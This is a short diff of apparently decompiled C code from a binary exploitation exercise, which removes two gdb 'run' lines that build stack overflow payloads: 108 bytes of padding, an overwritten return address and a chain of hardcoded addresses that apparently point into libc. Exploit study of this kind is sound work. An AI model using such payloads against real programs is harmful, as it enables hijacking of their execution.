@@ -36,8 +36,3 @@ void main(int param_1,int param_2)
   (**(code **)*this_00)(this_00,this);
   return;
 }
-
-
-run `python -c "print('A'*108 + '\x10\xf9\xff\xbf')"` `python -c "print('\x99\x86\x04\x08' + '\x60\xb0\xe6\xb7'  + '\xe0\xeb\xe5\xb7' + '\x58\x7c\xea\xb7')"`
-
-run `python -c "print('A'*108 + '\x10\xf9\xff\xbf')"` `python -c "print('\x58\x7c\xea\xb7' + '\xe0\xeb\xe5\xb7' + '\x60\xb0\xe6\xb7' + '\x99\x86\x04\x08')"`
